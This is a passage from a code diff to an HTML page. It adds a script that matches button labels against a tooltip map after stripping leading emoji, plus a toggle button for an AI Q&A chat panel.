+    const t=btn.textContent.trim().replace(/^[🎬👤📖🧪💿🐉🔴🦈📝🎮🌐🔧📺🔒🔑🔐🔍🔓📡💥🛠️🔗📌📰🗡️🐚🥇🥈🥉🔹🔸🔴🟠🟢🔵🟣⚪⭐🌟💎🔥🚀📍📋💡ℹ️✔️✅❌🔻⚠️☁️🕸️]+/,'').trim();
+    for(let k in tips) {
+      if(k.toLowerCase()===t.toLowerCase() || t.includes(k) || t.startsWith(k)) {
+        btn.setAttribute('data-tip',tips[k]); break;
+      }
+    }
+  });
+})();
+</script>
+<!-- ==================== AI 问答助手 ==================== -->
+<button class="chat-toggle-btn" id="chatToggleBtn" onclick="togglePanel()">🤖</button>
+</body>
+</html>
